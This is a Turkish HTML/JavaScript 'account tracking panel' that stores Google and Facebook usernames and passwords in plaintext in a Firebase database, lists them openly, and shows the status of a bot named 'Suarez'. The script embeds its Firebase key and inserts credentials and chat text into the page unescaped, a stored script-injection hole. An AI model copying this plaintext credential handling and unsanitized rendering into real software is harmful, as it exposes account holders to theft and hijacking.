<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hesap Takip Paneli</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #eef2f3; padding: 20px; }
        .container { max-width: 450px; margin: auto; }
        #dataList, #msgList { margin-bottom: 20px; max-height: 300px; overflow-y: auto; }
        .mesaj-kutusu { background: white; padding: 15px; border-radius: 8px; margin-bottom: 10px; border-left: 5px solid #5c67f2; display: flex; align-items: center; gap: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .mesaj-kutusu.bot-mesaj { background: #f2e8f8; border-left-color: #d048f6; }
        .mesaj-kutusu img { width: 30px; }
        .info { flex: 1; line-height: 1.6; }
        .del-btn { max-width: 50px; background: #ff4d4d; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }
        .panel { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; position: relative; }
        .logo-group { display: flex; gap: 10px; margin-bottom: 15px; }
        .platform-btn { flex: 1; padding: 10px; border: 2px solid #ddd; border-radius: 8px; cursor: pointer; text-align: center; transition: 0.3s; }
        .platform-btn img { width: 24px; vertical-align: middle; }
        .platform-btn.active { border-color: #5c67f2; background: #f0f2ff; }
        .input-row { display: flex; gap: 5px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        select { padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; }
        .btn-container { display: flex; gap: 10px; }
        button { flex: 1; padding: 12px; background: #5c67f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
        .multi-btn { background: #27ae60; }
        .chat-input { display: flex; flex-direction: row; justify-content: center; align-items: center; gap: 5px; margin-top: 10px; }

        /* Sağ üst küçük sembol buton */
        .settings-toggle-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            margin-top: 4px;
            background: linear-gradient(135deg, #ffffff, #f7f9fa);
            border: 1px solid #e1e8ed;
            color: #111;
            width: 38px;
            height: 38px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0;
            z-index: 10;
            overflow: visible;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.06);
            transition: all 0.2s ease;
        }
        .settings-toggle-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 3px 8px rgba(0,0,0,0.09);
        }

        /* SVG */
        .bot-svg {
            width: 22px;
            height: 22px;
            fill: #111111;
            transition: transform 0.3s ease;
        }

        .radar-dot {
            position: absolute;
            top: 6px;
            right: 6px;
            width: 5px;
            height: 5px;
            border-radius: 50%;
            display: none;
        }

        /* --- 1. UYUYOR --- */
        .state-uyuyor .q-left_eye,
        .state-uyuyor .q-right_eye { display: none; }
        .state-uyuyor .bot-svg {
            fill: #111111;
            animation: sweet-sleep 3.5s infinite ease-in-out;
        }
        .zzz-container {
            position: absolute;
            top: -24px;
            right: 4px;
            pointer-events: none;
            display: none;
        }
        .state-uyuyor .zzz-container { display: block; }
        .zzz {
            position: absolute;
            color: #8e44ad;
            font-weight: bold;
            font-size: 11px;
            opacity: 0;
            animation: rise-zzz 2.2s infinite linear;
        }
        .zzz:nth-child(2) { animation-delay: 0.7s; font-size: 13px; right: 6px; }
        .zzz:nth-child(3) { animation-delay: 1.4s; font-size: 15px; right: 12px; }

        @keyframes rise-zzz {
            0% { transform: translate(0, 0) scale(0.6); opacity: 0; }
            35% { opacity: 1; }
            100% { transform: translate(12px, -22px) scale(1.3); opacity: 0; }
        }
        @keyframes sweet-sleep {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(3px) scale(0.96) rotate(-3deg); }
        }

        /* --- 2. BEKLİYOR --- */
        .state-bekliyor .q-left_eye,
        .state-bekliyor .q-right_eye { display: block; }
        .state-bekliyor .bot-svg {
            fill: #111;
            animation: cute-bounce 1.4s infinite cubic-bezier(0.28, 0.84, 0.42, 1);
        }
        .popup-bubble {
            position: absolute;
            top: -38px;
            right: -10px;
            background: #000000;
            color: #ffffff;
            padding: 4px 9px;
            font-size: 10px;
            font-weight: 600;
            border-radius: 6px;
            white-space: nowrap;
            pointer-events: none;
            display: block;
            box-shadow: 0 3px 8px rgba(0,0,0,0.4);
            animation: pop-up-anim 2.8s ease-in-out;
        }

        @keyframes pop-up-anim {
            0%, 100% { transform: translateY(6px) scale(0.7); opacity: 0; }
            15%, 85% { transform: translateY(0px) scale(1); opacity: 1; }
            95% { transform: translateY(-5px) scale(0.85); opacity: 0; }
        }
        @keyframes cute-bounce {
            0%, 100% { transform: translateY(0) scale(1); }
            40% { transform: translateY(-4px) scale(1.03); }
            70% { transform: translateY(0) scale(0.98); }
        }

        /* --- 3. ÇALIŞIYOR --- */
        .state-calisiyor .q-left_eye,
        .state-calisiyor .q-right_eye { display: block; }
        .state-calisiyor .bot-svg {
            fill: url(#purpleGradient);
            animation: happy-pulse 0.6s infinite alternate ease-in-out;
        }
        .state-calisiyor .radar-dot {
            display: block;
            background: url(#purpleGradient);
            background-color: #8e44ad;
            box-shadow: 0 0 6px rgba(142, 68, 173, 0.9);
            animation: blink-dot 0.5s infinite alternate;
        }
        @keyframes happy-pulse {
            0% { transform: scale(0.94) rotate(-2deg); }
            100% { transform: scale(1.06) rotate(2deg); }
        }
        @keyframes blink-dot {
            0% { opacity: 0.3; transform: scale(0.7); }
            100% { opacity: 1; transform: scale(1.4); }
        }

        .settings-content { display: none; margin-bottom: 15px; border-top: 1px solid #eee; padding-top: 15px;  }
        .settings-content.open { display: block; }
        .master-toggle-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; padding: 6px 10px; background: #f0f2ff; border-radius: 6px; font-size: 13px; font-weight: bold; color: #5c67f2; }
        .platform-toggle-grid { width: 100%; display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; }
        .toggle-item { display: flex; align-items: center; justify-content: space-between; padding: 8px 12px; border: 1px solid #ddd; border-radius: 6px; background: #fafafa; font-size: 13px; }
        .toggle-item img { width: 18px; vertical-align: middle; margin-right: 5px; }
        .switch { position: relative; display: inline-block; width: 34px; height: 20px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .3s; border-radius: 20px; }
        .slider:before { position: absolute; content: ""; height: 12px; width: 12px; left: 4px; bottom: 4px; background-color: white; transition: .3s; border-radius: 50%; }
        input:checked + .slider { background-color: #27ae60; }
        input:checked + .slider:before { transform: translateX(14px); }

        .avg-time-box { background: #f9fbfb; border: 1px dashed #d1dede; padding: 10px; border-radius: 6px; margin-top: 12px; font-size: 12px; color: #444; }
    </style>
</head>

<script id="engine-script" type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
    import { getDatabase, ref, push, onChildAdded, onValue, remove, onChildRemoved, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

    window.getDatabase = getDatabase;
    window.ref = ref;
    window.push = push;
    window.set = set;
    window.onChildAdded = onChildAdded;
    window.onValue = onValue;
    window.remove = remove;
    window.onChildRemoved = onChildRemoved;
    window.initializeApp = initializeApp;

    const firebaseConfig = {
        apiKey: "AIzaSyBV7jtoXPBcPdclcBseOK39wJsSXUxLpg4",
        databaseURL: "https://atamossocket-default-rtdb.firebaseio.com",
        projectId: "atamossocket"
    };
    const db = getDatabase(initializeApp(firebaseConfig));
    const dataRef = ref(db, 'hesaplar');
    const msgRef = ref(db, 'mesajlar');
    const settingsRef = ref(db, 'ayarlar/platformlar');
    window.botRef = ref(db, 'suarez/action');
    window.botPopRef = ref(db, 'suarezPop');

    onValue(window.botRef, (snapshot) => {
        const val = snapshot.val();
        if (!val) {
            set(window.botRef, 'uyuyor');
        } else {
            updateBotIconState(val);
        }
    });

    const waitingPhrases = ["Sıkıldım!", "Hadi artık!", "Biz hazırız", "Bekliyorum.."];
    let popupInterval = null;

    function showPopupText(text, shouldDeleteKey = null) {
        const popupEl = document.getElementById('popupMsg');
        popupEl.innerText = text;
        popupEl.style.display = 'block';
        popupEl.style.animation = 'none';
        popupEl.offsetHeight;
        popupEl.style.animation = 'pop-up-anim 3s ease-in-out';

        setTimeout(() => {
            popupEl.style.display = 'none';
            if (shouldDeleteKey) {
                remove(ref(db, `suarezPop/${shouldDeleteKey}`));
            }
        }, 3000);
    }

    function updateBotIconState(action) {
        const btn = document.getElementById('toggleSettingsBtn');
        btn.classList.remove('state-uyuyor', 'state-bekliyor', 'state-calisiyor');

        if (popupInterval) {
            clearInterval(popupInterval);
            popupInterval = null;
        }

        const act = (action || 'uyuyor').toLowerCase();
        if (act.includes('uyuyor') || act.includes('passive')) {
            btn.classList.add('state-uyuyor');
            document.getElementById('popupMsg').style.display = 'none';
        } else if (act.includes('bekliyor')) {
            btn.classList.add('state-bekliyor');
            startBalancedPopups();
        } else if (act.includes('çalışıyor') || act.includes('calisiyor') || act.includes('aktif')) {
            btn.classList.add('state-calisiyor');
            document.getElementById('popupMsg').style.display = 'none';
        } else {
            btn.classList.add('state-uyuyor');
        }
    }

    function startBalancedPopups() {
        const triggerPopup = () => {
            const randomText = waitingPhrases[Math.floor(Math.random() * waitingPhrases.length)];
            showPopupText(randomText);
        };
        triggerPopup();
        popupInterval = setInterval(triggerPopup, 3000);
    }

    onChildAdded(window.botPopRef, (data) => {
        const val = data.val();
        if (val) {
            const textContent = typeof val === 'object' ? val.text : val;
            if (textContent) {
                showPopupText(textContent, data.key);
            }
        }
    });

    document.getElementById('toggleSettingsBtn').onclick = () => {
        document.getElementById('settingsPanel').classList.toggle('open');
    };

    window.togglePlatformStatus = (p, status) => {
        set(ref(db, `ayarlar/platformlar/${p}`), status);
        checkMasterToggleState();
        updateAverageTimeUI();
    };

    window.toggleAllPlatforms = (status) => {
        for (let p in settingsPlatforms) {
            settingsPlatforms[p].active = status;
            set(ref(db, `ayarlar/platformlar/${p}`), status);
        }
        renderSettingsUI();
        updateAverageTimeUI();
    };

    function checkMasterToggleState() {
        const allKeys = Object.keys(settingsPlatforms);
        const allActive = allKeys.every(k => settingsPlatforms[k].active);
        document.getElementById('masterToggle').checked = allActive;
    }

    function updateAverageTimeUI() {
        const activePlatforms = Object.keys(settingsPlatforms).filter(k => settingsPlatforms[k].active);
        const container = document.getElementById('avgTimeList');

        if (activePlatforms.length === 0) {
            container.innerHTML = '<b style="color:#ff4d4d;">Aktif platform yok!</b>';
            return;
        }

        const baseMinutes = 10;
        // Her platformun kendi dakika değerini (1, 2, 3) topla
        const addMinutes = activePlatforms.reduce((sum, p) => sum + (settingsPlatforms[p].minutes || Math.floor(Math.random() * 3) + 1), 0);
        const totalMinutes = baseMinutes + addMinutes;

        container.innerHTML = `<b style="color:#27ae60;">${totalMinutes} dakika</b>`;
    }

    function renderSettingsUI() {
        const toggleGrid = document.getElementById('platformToggleGrid');
        toggleGrid.innerHTML = '';
        for (let p in settingsPlatforms) {
            const data = settingsPlatforms[p];
            const item = document.createElement('div');
            item.className = 'toggle-item';
            item.innerHTML = `
                <span><img src="${data.logo}">${p} <small style="color:#888;">(${data.m || data.minutes} dk)</small></span>
                <label class="switch">
                    <input type="checkbox" ${data.active ? 'checked' : ''} onchange="togglePlatformStatus('${p}', this.checked)">
                    <span class="slider"></span>
                </label>
            `;
            toggleGrid.appendChild(item);
        }
        checkMasterToggleState();
        updateAverageTimeUI();
    }

    onValue(settingsRef, (snapshot) => {
        const val = snapshot.val();
        if (val) {
            for (let p in val) {
                if (settingsPlatforms[p]) {
                    settingsPlatforms[p].active = val[p];
                }
            }
        } else {
            for (let p in settingsPlatforms) {
                set(ref(db, `ayarlar/platformlar/${p}`), settingsPlatforms[p].active);
            }
        }
        renderSettingsUI();
    });

    onValue(dataRef, (snapshot) => {
        document.getElementById('accCount').innerText = snapshot.size || 0;
    });

    window.selectPlatform = (p) => {
        document.getElementById('selectedPlatform').value = p;
        document.getElementById('btnGoogle').className = p === 'Google' ? 'platform-btn active' : 'platform-btn';
        document.getElementById('btnFacebook').className = p === 'Facebook' ? 'platform-btn active' : 'platform-btn';
    };

    document.getElementById('sendBtn').onclick = () => {
        const u = document.getElementById('usernameInput').value;
        const d = document.getElementById('domainSelect').value;
        const p = document.getElementById('passwordInput').value;
        if(!u || !p) return alert("Alanları boş bırakma!");
        push(dataRef, { platform: document.getElementById('selectedPlatform').value, user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        document.getElementById('usernameInput').value = '';
        document.getElementById('passwordInput').value = '';
    };

    document.getElementById('sendMultiBtn').onclick = () => {
        const u = document.getElementById('usernameInput').value;
        const d = document.getElementById('domainSelect').value;
        const p = document.getElementById('passwordInput').value;
        if(!u || !p) return alert("Alanları boş bırakma!");
        push(dataRef, { platform: 'Google', user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        push(dataRef, { platform: 'Facebook', user: u + d, pass: p, time: new Date().toLocaleTimeString() });
        document.getElementById('usernameInput').value = '';
        document.getElementById('passwordInput').value = '';
    };

    document.getElementById('sendChatBtn').onclick = () => {
        let msg = document.getElementById('chatMsg').value.trim();
        if(!msg) return;

        let isBot = false;
        if (msg.startsWith('/bot') || msg.startsWith('/suarez')) {
            isBot = true;
            msg = msg.replace('/bot', '').replace('/suarez', '').trim();
        }

        if(!msg) return;
        push(msgRef, { text: msg, isBot: isBot, time: new Date().toLocaleTimeString() });
        document.getElementById('chatMsg').value = '';
    };

    onChildAdded(dataRef, (data) => {
        const v = data.val();
        const logo = v.platform === 'Google' ? 'https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg' : 'https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg';
        const div = document.createElement('div');
        div.className = 'mesaj-kutusu';
        div.id = data.key;
        div.innerHTML = `
        <img src="${logo}">
        <div class="info">
            <strong quasar-platform="${v.platform}">${v.platform}</strong><br>
            <span class="q-userName">${v.user}</span><br>
            <span class="q-password">${v.pass}</span>
        </div>
        <button class="del-btn" onclick="removeData('${data.key}')">Sil</button>
    `;
        const list = document.getElementById('dataList');
        const oldFirst = list.querySelector('.first-item');
        if (oldFirst) oldFirst.classList.remove('first-item');
        div.classList.add('first-item');
        list.prepend(div);
    });

    onChildRemoved(dataRef, (data) => {
        const element = document.getElementById(data.key);
        if (element) {
            element.remove();
        }
    });

    onChildAdded(msgRef, (data) => {
        const val = data.val();
        const div = document.createElement('div');
        div.className = val.isBot ? 'mesaj-kutusu bot-mesaj' : 'mesaj-kutusu';
        if (!val.isBot) div.style.borderLeftColor = '#27ae60';

        const prefix = val.isBot ? '<strong>[Suarez]:</strong> ' : '';
        div.innerHTML = `<div class="info">${prefix}${val.text} <br><small>${val.time}</small></div>`;
        document.getElementById('msgList').prepend(div);
    });

    window.removeData = (key) => {
        remove(ref(db, 'hesaplar/' + key));
    };

    setInterval(() => {
        remove(msgRef)
            .then(() => {
                console.log("Mesajlar başarıyla sıfırlandı.");
                document.getElementById('msgList').innerHTML = '';
            })
            .catch((error) => {
                console.error("Mesajlar silinirken hata oluştu: ", error);
            });
    }, 900000);

    window.dataRef = ref(db, 'hesaplar');
